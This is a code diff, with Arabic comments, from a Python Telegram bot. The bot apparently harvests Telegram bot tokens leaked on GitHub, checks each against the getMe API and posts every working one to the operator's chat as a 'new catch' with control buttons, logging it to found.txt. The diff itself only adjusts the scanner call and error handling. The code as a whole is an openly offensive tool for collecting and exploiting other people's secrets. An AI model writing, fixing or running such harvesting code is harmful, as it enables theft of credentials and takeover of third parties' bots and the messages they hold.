@@ -6,7 +6,7 @@ from controller import get_bot_info, get_bot_messages
 # إعدادات البوت
 BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
 CHAT_ID = os.getenv('CHAT_ID')
-GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
+# GITHUB_TOKEN موجود الآن داخل scanner.py ولا نحتاجه هنا للمسح
 FOUND_FILE = "found.txt"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -57,15 +57,17 @@ def callback_query(call):
 def run_scanner():
     while True:
         try:
-            tokens = search_for_tokens(GITHUB_TOKEN)
+            # تم التعديل هنا: استدعاء الدالة بدون مدخلات
+            tokens = search_for_tokens()
             for token in tokens:
                 if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
                     if requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).status_code == 200:
                         bot.send_message(CHAT_ID, f"🔥 صيد جديد:\n`{token}`", 
                                          parse_mode="Markdown", reply_markup=get_markup(token))
                         with open(FOUND_FILE, "a") as f: f.write(token + "\n")
-        except: pass
-        time.sleep(60)
+        except Exception as e:
+            print(f"Scanner Loop Error: {e}")
+        time.sleep(120) # تأخير دقيقتين لزيادة الاستقرار
 
 # --- التشغيل الأساسي ---
 def run_manual_polling():
